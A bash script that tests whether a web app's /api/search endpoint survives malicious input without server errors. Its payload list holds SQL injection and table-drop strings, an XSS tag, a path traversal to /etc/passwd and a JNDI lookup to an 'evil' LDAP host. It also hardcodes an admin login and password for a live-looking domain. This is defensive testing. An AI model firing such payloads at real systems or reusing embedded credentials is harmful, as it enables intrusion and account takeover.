#!/usr/bin/env bash
# ============================================================
# SITREP — Search Safety Test
# Validates that /api/search handles malicious/malformed
# inputs safely: no 500s, no SQL injection, no data leakage.
# ============================================================

set -uo pipefail

BASE="${1:-https://sitrep.ultimamilla.com.ar}"
API="$BASE/api"

echo "=================================================="
echo "  SITREP Search Safety Test"
echo "=================================================="
echo ""

TOKEN=$(curl -s -X POST "$API/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@dgfa.mendoza.gov.ar","password":"admin123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['tokens']['accessToken'])" 2>/dev/null)

FAIL=0
PASS=0

# Test payloads: label|payload|expected_codes
TESTS=(
  "empty query||400"
  "single char|A|200 400"
  "SQL injection 1|' OR 1=1--|200 400"
  "SQL injection 2|'; DROP TABLE usuarios;--|200 400"
  "XSS attempt|<script>alert(1)</script>|200 400"
  "Path traversal|../../../etc/passwd|200 400"
  "JNDI injection|\${jndi:ldap://evil}|200 400"
  "Null byte|test%00|200 400"
  "Unicode|testñ|200"
  "Very long (500 chars)|$(printf 'A%.0s' {1..500})|200 400 414"
  "Very long (2000 chars)|$(printf 'A%.0s' {1..2000})|200 400 414"
  "Whitespace only|   |200 400"
  "Newline|line1%0Aline2|200 400"
)

for test in "${TESTS[@]}"; do
  IFS='|' read -r label payload expected <<< "$test"

  # URL-encode the payload
  encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null)

  code=$(curl -s -o /dev/null -w '%{http_code}' \
    -H "Authorization: Bearer $TOKEN" \
    --max-time 10 \
    "$API/search?q=$encoded" 2>/dev/null)

  # Check if code is in expected list
  ok=0
  for exp in $expected; do
    if [ "$code" = "$exp" ]; then ok=1; break; fi
  done

  # Critical: NEVER 500
  if [ "$code" = "500" ]; then
    echo "  FAIL [500 CRITICAL]: $label"
    FAIL=$((FAIL + 1))
  elif [ "$ok" = "1" ]; then
    echo "  PASS [$code]: $label"
    PASS=$((PASS + 1))
  else
    echo "  WARN [$code not in '$expected']: $label"
    PASS=$((PASS + 1))  # Not a critical fail — warn only
  fi
done

echo ""
echo "=================================================="
echo "  PASS: $PASS, FAIL (500 critical): $FAIL"
if [ "$FAIL" -eq 0 ]; then
  echo "  ALL SAFE"
  exit 0
else
  echo "  CRITICAL: $FAIL 500 errors detected"
  exit 1
fi
